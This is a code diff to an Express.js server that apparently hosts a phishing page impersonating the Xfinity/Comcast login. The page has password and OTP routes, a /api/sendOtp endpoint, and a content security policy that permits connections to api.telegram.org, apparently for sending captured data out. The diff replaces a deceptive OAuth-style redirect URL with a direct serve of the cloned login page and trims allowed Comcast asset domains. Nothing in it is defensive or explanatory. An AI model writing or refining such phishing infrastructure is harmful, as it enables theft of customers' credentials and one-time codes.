@@ -53,7 +53,7 @@ app.use((req, res, next) => {
   // CSP — prevent framing and restrict resources
   res.setHeader(
     'Content-Security-Policy',
-    "default-src 'self' https://login.xfinity.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://login.xfinity.com; img-src 'self' data: https://login.xfinity.com https://*.xfinity.com https://*.comcast.com; font-src 'self' https://login.xfinity.com https://assets.comcast.com https://static.cimcontent.net; connect-src 'self' https://api.telegram.org; frame-ancestors 'none'"
+    "default-src 'self' https://login.xfinity.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://login.xfinity.com; img-src 'self' data: https://login.xfinity.com https://*.xfinity.com; font-src 'self' https://login.xfinity.com; connect-src 'self' https://api.telegram.org; frame-ancestors 'none'"
   );
 
   next();
@@ -322,9 +322,7 @@ app.post('/api/sendOtp', rateLimit, async (req, res) => {
 const distPath = join(__dirname, 'dist');
 
 // Serve static files from dist/ with correct MIME types for .js.download files
-// index: false prevents express.static from auto-serving index.html at /
 app.use(express.static(distPath, {
-  index: false,
   setHeaders: (res, filePath) => {
     if (filePath.endsWith('.js.download')) {
       res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
@@ -332,9 +330,9 @@ app.use(express.static(distPath, {
   },
 }));
 
-// Redirect root to Xfinity login page with long OAuth-style URL (>150 chars)
+// Serve the Xfinity login page at root
 app.get('/', (req, res) => {
-  res.redirect(302, '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en');
+  res.sendFile(join(distPath, 'login.html'));
 });
 
 // SPA fallback - for /password, /otp and other React routes
